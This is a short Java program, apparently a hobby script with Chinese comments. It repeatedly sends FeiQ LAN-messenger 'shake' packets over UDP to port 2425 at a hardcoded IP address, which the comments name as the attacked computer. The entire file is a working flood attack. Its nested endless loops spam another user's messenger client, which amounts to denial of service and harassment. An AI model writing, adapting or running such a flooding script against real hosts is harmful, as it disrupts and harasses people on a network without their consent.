 
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.SocketException;
import java.util.Scanner;
 
public class test1 {
 
	@SuppressWarnings("resource")
	public static void main(String[] args) throws IOException {
		//创建数据包接口对象
		DatagramSocket da = new DatagramSocket();
		while(true){
			//这个字符串为飞秋的震动报文
			String a="1_lbt4_0#128#000C29D68D8F#0#0#0#2.5a:1399716676:%s:%s:209:.";
			byte[] by = a.getBytes();
			while(true){
				//装包
				DatagramPacket daPacket = new DatagramPacket(by, by.length,
						//端口号为飞秋的udp端口号，
						//IP为攻击电脑的ip
				InetAddress.getByName("176.114.11.223"), 2425 );
				
//				发送
				da.send(daPacket);
			}
		}
		
//		关流
		
 
	}
 
}
